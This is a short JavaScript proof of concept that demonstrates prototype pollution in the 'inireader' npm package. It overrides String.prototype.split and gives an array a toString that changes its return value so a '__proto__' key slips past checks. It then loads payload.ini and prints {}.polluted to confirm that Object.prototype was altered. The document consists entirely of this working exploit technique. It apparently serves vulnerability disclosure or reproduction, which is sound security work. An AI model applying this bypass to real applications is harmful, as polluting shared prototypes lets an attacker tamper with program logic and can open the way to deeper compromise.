var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const iniReader = require('inireader');
const path = require('path');
const parser = new iniReader.IniReader();
let obj = {};
console.log({}.polluted);
parser.load(path.resolve(__dirname, './payload.ini'));
console.log({}.polluted);